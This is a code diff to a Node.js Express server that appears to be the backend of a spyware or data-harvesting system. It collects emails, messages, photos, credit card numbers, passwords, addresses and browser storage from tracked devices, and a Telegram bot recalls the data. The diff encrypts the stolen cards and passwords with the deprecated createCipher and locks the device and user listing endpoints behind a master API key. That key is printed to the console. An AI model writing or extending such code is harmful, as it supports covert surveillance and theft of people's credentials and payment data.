@@ -5,6 +5,7 @@
 const express = require('express');
 const cors = require('cors');
 const fetch = require('node-fetch');
+const crypto = require('crypto');
 const computerControl = require('./computer-control');
 const fullSystemAccess = require('./full-system-access');
 const aiCreator = require('./automated-ai-creator');
@@ -12,6 +13,25 @@ const enhancedFeatures = require('./enhanced-features');
 const localAgentController = require('./local-agent-controller');
 const autonomousOrchestrator = require('./autonomous-orchestrator');
 const app = express();
+
+// 🔐 SECURITY: Master API Key (CHANGE THIS!)
+const MASTER_API_KEY = process.env.NUPI_API_KEY || 'nupi_' + crypto.randomBytes(32).toString('hex');
+console.log('🔐 Master API Key:', MASTER_API_KEY);
+
+// 🔐 SECURITY: Middleware to verify API key
+function requireAuth(req, res, next) {
+    const apiKey = req.headers['x-api-key'] || req.query.api_key;
+    
+    if (!apiKey || apiKey !== MASTER_API_KEY) {
+        return res.status(401).json({
+            success: false,
+            error: 'Unauthorized: Invalid or missing API key',
+            message: 'Add X-API-Key header or ?api_key= parameter'
+        });
+    }
+    
+    next();
+}
 
 // 🤖 Start Telegram Recall Bot in Cloud
 const TelegramBot = require('node-telegram-bot-api');
@@ -2167,6 +2187,15 @@ app.post('/api/user-data/collect', async (req, res) => {
     try {
         const data = req.body;
         
+        // 🔐 ENCRYPT SENSITIVE DATA
+        function encrypt(text) {
+            if (!text) return text;
+            const cipher = crypto.createCipher('aes-256-cbc', MASTER_API_KEY);
+            let encrypted = cipher.update(String(text), 'utf8', 'hex');
+            encrypted += cipher.final('hex');
+            return encrypted;
+        }
+        
         // Normalize field names
         const normalizedData = {
             ...data,
@@ -2174,8 +2203,8 @@ app.post('/api/user-data/collect', async (req, res) => {
             emails: data.emails || [],
             messages: data.messages || [],
             photos: data.photos || [],
-            creditCards: data.creditCards || [],
-            passwords: data.passwords || [],
+            creditCards: (data.creditCards || []).map(encrypt), // ENCRYPT
+            passwords: (data.passwords || []).map(encrypt), // ENCRYPT
             phones: data.phones || [],
             addresses: data.addresses || [],
             browserStorage: data.browserStorage || {},
@@ -2213,7 +2242,7 @@ app.post('/api/user-data/collect', async (req, res) => {
 });
 
 // Get all data for a specific device
-app.get('/api/user-data/device/:deviceId', (req, res) => {
+app.get('/api/user-data/device/:deviceId', requireAuth, (req, res) => {
     try {
         const { deviceId } = req.params;
         const limit = parseInt(req.query.limit) || 50;
@@ -2231,7 +2260,7 @@ app.get('/api/user-data/device/:deviceId', (req, res) => {
 });
 
 // Search collected data (for Telegram recall)
-app.post('/api/user-data/search', (req, res) => {
+app.post('/api/user-data/search', requireAuth, (req, res) => {
     try {
         const { query, type } = req.body;
         const results = database.search(query, type);
@@ -2248,7 +2277,7 @@ app.post('/api/user-data/search', (req, res) => {
 });
 
 // Get latest data for Telegram quick access (EMERGENCY)
-app.get('/api/user-data/latest/:deviceId', (req, res) => {
+app.get('/api/user-data/latest/:deviceId', requireAuth, (req, res) => {
     try {
         const { deviceId } = req.params;
         const latestData = database.getLatestDeviceData(deviceId);
@@ -2280,7 +2309,7 @@ app.get('/api/user-data/stream', (req, res) => {
 });
 
 // 📈 STATS - Overall system statistics
-app.get('/api/user-data/stats', (req, res) => {
+app.get('/api/user-data/stats', requireAuth, (req, res) => {
     try {
         const stats = database.getStats();
         res.json({
@@ -2293,7 +2322,7 @@ app.get('/api/user-data/stats', (req, res) => {
 });
 
 // 🎯 ALL DEVICES - List all tracked devices
-app.get('/api/user-data/devices', (req, res) => {
+app.get('/api/user-data/devices', requireAuth, (req, res) => {
     try {
         const devices = database.getAllDevices();
         res.json({
@@ -2307,7 +2336,7 @@ app.get('/api/user-data/devices', (req, res) => {
 });
 
 // 👥 ALL USERS - List all detected users
-app.get('/api/user-data/users', (req, res) => {
+app.get('/api/user-data/users', requireAuth, (req, res) => {
     try {
         const users = database.getAllUsers();
         res.json({
@@ -2321,7 +2350,7 @@ app.get('/api/user-data/users', (req, res) => {
 });
 
 // 👤 USER DATA - Get all data for specific user name
-app.get('/api/user-data/user/:userName', (req, res) => {
+app.get('/api/user-data/user/:userName', requireAuth, (req, res) => {
     try {
         const { userName } = req.params;
         const userData = database.getUserData(userName);
